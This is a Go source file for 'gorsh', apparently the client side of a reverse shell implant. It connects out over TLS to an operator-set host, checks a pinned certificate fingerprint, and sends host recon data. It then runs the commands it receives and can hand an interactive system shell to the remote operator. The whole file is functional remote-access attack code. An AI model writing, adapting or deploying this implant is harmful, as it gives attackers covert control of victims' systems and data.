package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"

	"github.com/audibleblink/gorsh/internal/commands"
	"github.com/audibleblink/gorsh/internal/shell"
	"github.com/audibleblink/gorsh/internal/sitrep"
)

const (
	ERR_COULD_NOT_DECODE = 1 << iota
	ERR_HOST_UNREACHABLE = iota
	ERR_BAD_FINGERPRINT  = iota
)

var (
	connectString string
	fingerPrint   string
)

func send(conn net.Conn, msg string) {
	conn.Write([]byte("\n"))
	conn.Write([]byte(msg))
	conn.Write([]byte("\n"))
}

func interactiveShell(conn net.Conn) {
	var (
		name, _                = os.Hostname()
		prompt  string         = fmt.Sprintf("\n[%s]> ", name)
		scanner *bufio.Scanner = bufio.NewScanner(conn)
	)

	// Print basic recon data on first connect
	send(conn, sitrep.SysInfo())
	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		if command == "exit" {
			break
		} else if command == "shell" {
			runShell(conn)
		} else if len(command) > 1 {
			argv := strings.Split(command, " ")
			out := commands.Route(argv)
			send(conn, out)
		}

		conn.Write([]byte(prompt))
	}
}

func runShell(conn net.Conn) {
	var cmd *exec.Cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid
}

func initReverseShell(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)

	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}
	defer conn.Close()

	if ok := isValidKey(conn, fingerprint); !ok {
		os.Exit(ERR_BAD_FINGERPRINT)
	}
	interactiveShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		initReverseShell(connectString, bytesFingerprint)
	}
}
